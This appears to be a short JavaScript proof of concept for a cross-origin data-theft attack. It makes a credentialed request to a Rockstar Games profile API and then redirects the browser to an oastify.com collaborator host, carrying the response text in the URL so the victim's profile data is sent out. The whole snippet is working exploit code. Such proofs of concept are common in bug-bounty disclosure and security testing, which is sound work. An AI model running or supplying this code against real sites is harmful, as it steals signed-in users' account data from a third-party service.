var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://scapi.rockstargames.com/profile/getbasicprofile',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://89fdn0hjc1z8sgaguj53ft52wt2kqaez.oastify.com/log?key='+this.responseText;
};
